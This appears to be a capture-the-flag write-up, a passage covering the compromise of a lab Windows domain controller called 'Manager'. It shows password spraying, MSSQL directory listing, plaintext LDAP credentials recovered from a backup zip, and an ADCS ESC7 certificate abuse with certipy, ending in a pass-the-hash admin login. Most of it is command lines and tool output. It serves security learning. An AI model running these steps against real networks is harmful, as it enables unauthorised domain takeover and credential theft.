2026/02/23 17:10:11 >  [+] VALID USERNAME:       GUEST@manager.htb
2026/02/23 17:10:11 >  [+] VALID USERNAME:       Guest@manager.htb
2026/02/23 17:10:12 >  [+] VALID USERNAME:       OPERATOR@manager.htb
2026/02/23 17:10:12 >  [+] VALID USERNAME:       Operator@manager.htb
2026/02/23 17:10:12 >  [+] VALID USERNAME:       administrator@manager.htb
2026/02/23 17:10:12 >  [+] VALID USERNAME:       guest@manager.htb
2026/02/23 17:10:12 >  [+] VALID USERNAME:       operator@manager.htb
2026/02/23 17:10:13 >  Done! Tested 828 usernames (9 valid) in 1.499 seconds
```
- Success varies by wordlist

## HTTP - TCP 80
---
- Navigating to `http://manager.htb/` shows a site advertising Content Writing Services
- The site utilizies `.html` extensions, keep that in our minds for `feroxbuster`
- There's a contact endpoint but submitting doesn't actually pass our parameters
- We can use `feroxbuster` to enumerate subdirectories
```sh
❯ feroxbuster -u "http://manager.htb" -x html,txt -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 
```
- But we don't get anything interesting

# User Auth - operator
## Back to SMB
---
- Since it doesn't look like we've got any potential passwords, we can try passing usernames as passwords themselves
- **IMPORTANT** the case is sensitive, and the password only worked when all lowercase
```sh
❯ nxc smb 10.129.5.156 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
SMB         10.129.5.156    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Enterprise Read-only Domain Controllers:enterprise read-only domain controllers (Guest)
SMB         10.129.5.156    445    DC01             [-] manager.htb\Administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [-] manager.htb\Guest:guest STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [+] manager.htb\Domain Admins:domain admins (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Domain Users:domain users (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Domain Guests:domain guests (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Domain Computers:domain computers (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Domain Controllers:domain controllers (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Cert Publishers:cert publishers (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Schema Admins:schema admins (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Enterprise Admins:enterprise admins (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Group Policy Creator Owners:group policy creator owners (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Read-only Domain Controllers:read-only domain controllers (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Cloneable Domain Controllers:cloneable domain controllers (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Protected Users:protected users (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Key Admins:key admins (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Enterprise Key Admins:enterprise key admins (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\RAS and IAS Servers:ras and ias servers (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Allowed RODC Password Replication Group:allowed rodc password replication group (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\Denied RODC Password Replication Group:denied rodc password replication group (Guest)
SMB         10.129.5.156    445    DC01             [-] manager.htb\DC01$:dc01$ STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [+] manager.htb\DnsAdmins:dnsadmins (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\DnsUpdateProxy:dnsupdateproxy (Guest)
SMB         10.129.5.156    445    DC01             [+] manager.htb\SQLServer2005SQLBrowserUser$DC01:sqlserver2005sqlbrowseruser$dc01 (Guest)
SMB         10.129.5.156    445    DC01             [-] manager.htb\Zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [-] manager.htb\Cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [-] manager.htb\Ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [-] manager.htb\Raven:raven STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [-] manager.htb\JinWoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [-] manager.htb\ChinHae:chinhae STATUS_LOGON_FAILURE 
SMB         10.129.5.156    445    DC01             [+] manager.htb\Operator:operator 
```
- We got a single account login that wasn't `Guest`, `operator:operator`
- We have access to more default shares but they don't contain anything interesting
- We don't have `WinRM` access with `operator`

## Bloodhound
---
- Now that we've got `LDAP` auth, we can collect data for bloodhound
- We want to make sure we've fixed [[Strats#Align With Host's Clock Slew|clock skew]] though
```sh
❯ bloodhound-ce-python -d manager.htb -ns 10.129.5.156 -u operator -p operator -c all --zip

❯ rusthound -d manager.htb -n $IP -u operator -p operator --adcs -z
```

- We don't see anything interesting, `operator` doesn't have much control over anyone other than `guest`

## MSSQL - TCP 1433
---
- We can verify with `nxc` that `operator` has access to `mssql`
```sh
❯ nxc mssql $IP -u operator -p operator                                            
MSSQL       10.129.5.156    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) (EncryptionReq:False)
MSSQL       10.129.5.156    1433   DC01             [+] manager.htb\operator:operator 
```

- We can use `impacket`'s `mssqlclient.py` to get an interactive `mssql` shell
```sh
❯ mssqlclient.py -windows-auth manager.htb/operator:operator@$IP
SQL (MANAGER\Operator  guest@master)> 
```

- We can enumerate `mssql` databases with the following command:
```sh
SQL (MANAGER\Operator  guest@master)> select name from master..sysdatabases;
name     
------   
master   
tempdb   
model    
msdb     
```
- All four of these databases are the [defaults](https://dataedo.com/kb/databases/sql-server/default-databases-schemas)

- We can see fancy commands via `mssqlclient.py` by typing `help`
```sh
SQL (MANAGER\Operator  guest@master)> help
    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    download {from} {to}       - downloads file from the SQLServer host {from} to {to}
    show_query                 - show query
    mask_query                 - mask query
```

- `xp_cmdshell` is a [feature](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16) in `mssql` to run commands on the system
```sh
SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
```
- doesn't look like `operator` can do it

- `xp_dirtree` is another [feature](https://www.sqlservercentral.com/blogs/how-to-use-xp_dirtree-to-list-all-files-in-a-folder) for listing files on the target filesystem
```sh
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   
Documents and Settings          1      0   
inetpub                         1      0   
PerfLogs                        1      0   
Program Files                   1      0   
Program Files (x86)             1      0   
ProgramData                     1      0   
Recovery                        1      0   
SQL2019                         1      0   
System Volume Information       1      0   
Users                           1      0   
Windows                         1      0   
```
- it works! Nice

```sh
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\Users
subdirectory    depth   file   
-------------   -----   ----   
Administrator       1      0   
All Users           1      0   
Default             1      0   
Default User        1      0   
Public              1      0   
Raven               1      0   
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\Users\Raven
subdirectory   depth   file   
------------   -----   ----   
SQL (MANAGER\Operator  guest@master)> 
```
- We're unable to enumerate `raven`'s home directory
- We can't enumerate the program files directories either

```sh
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1   
```
- Looks like we're able to enumerate the web root directory and we see some interesting files!
- We can't access `web.config` but we're able to grab the zipfile

# User Shell - raven
## Website-Backup
---
- We can unarchive the zipfile to find the file `.old-conf.xml`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```
- We've got creds! `raven:R4v3nBe5tD3veloP3r!123`
- We can verify they work via `WinRM`
```sh
❯ nxc winrm $IP -u raven -p 'R4v3nBe5tD3veloP3r!123'
WINRM       10.129.5.156    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb) 
WINRM       10.129.5.156    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

## Enumeration as raven
---
- We can spawn a `WinRM` shell with `evil-winrm` and grab the `user.txt`
```sh
❯ evil-winrm -i $IP -u raven -p 'R4v3nBe5tD3veloP3r!123'
*Evil-WinRM* PS C:\Users\Raven\Desktop> cat user.txt
c93c4b89b5b2b25c63b42e894a4e77f2
```

- There's nothing interesting in the user directory, program files, or the recycling bin

## ADCS
---
- Since bloodhound doesn't have much interesting after adding `raven`, we can use `ceritipy` to check the Active Directory Certificate Service for vulnerable certificates
```sh
❯ certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip $IP -vulnerable -stdout
...
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```
- Looks like `raven` has access to a certificate that's vulnerable to [ESC7](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca)
- We have the `Manage CA` permission, allowing us to modify the certificate's configuration and assign roles, security, etc.

# Root Shell
## ESC7
---
- [ESC7](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca) addresses vulnerabilities arising from an attacker obtaining highly privileged permissions that grant significant control over the CA's operations and security:
	- **`Manage CA` (CA Administrator/ManageCa):** This permission grants extensive control over the CA, including the ability to modify its configuration (e.g., which certificate templates are published), assign CA roles (including Certificate Manager/Officer, if needed), start/stop the CA service, and manage CA security. **This is the core permission that ESC7 often revolves around.**
	- **`Manage Certificates` (Certificate Manager/Officer):** This permission allows a user to approve or deny pending certificate requests and to revoke issued certificates.

- Going with the certipy wiki, it looks like the best way to exploit this vuln is by abusing the default `SubCA` template to issue a privileged identity
- `SubCA` is notable b/c it can be used for any purpose and allows the enrolee to specify the subject name 

### exploit
1. Ensure capability to approve requests
```sh
❯ certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ns $IP -target $IP -ca manager-dc01-ca -add-officer raven       
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-dc01-ca'
```

2. Ensure `SubCA` is enabled
```sh
❯ certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ns $IP -target $IP -ca manager-dc01-ca -enable-template 'SubCA'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-dc01-ca'
```

3. Submit cert request using `SubCA` template
```sh
❯ certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip $IP -target $IP -ca manager-dc01-ca -template 'SubCA' -upn administrator@manager.htb 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 19
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '19.key'
[*] Wrote private key to '19.key'
[-] Failed to request certificate
```
- The request fails but the private key is saved, this is expected behavior as we lack specific enrollment rights on this template

4. Approve pending request
```sh
❯ certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-dc01-ca -issue-request 19       
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 19
```
- I had to re-do step 1 for some reason but afterwards it worked

5. Retrieve the issued certificate
```sh
❯ certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-dc01-ca -retrieve 19                                     
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 19
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '19.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

6. Gain admin auth
```sh
❯ certipy auth -pfx administrator.pfx -dc-ip $IP
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```
- And we've got an admin hash! `ae5064c2f62317332c88629e025924ef`

```sh
❯ evil-winrm -i $IP -u administrator -H ae5064c2f62317332c88629e025924ef
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
6303e52e74b12600008ff61360d6530b
```





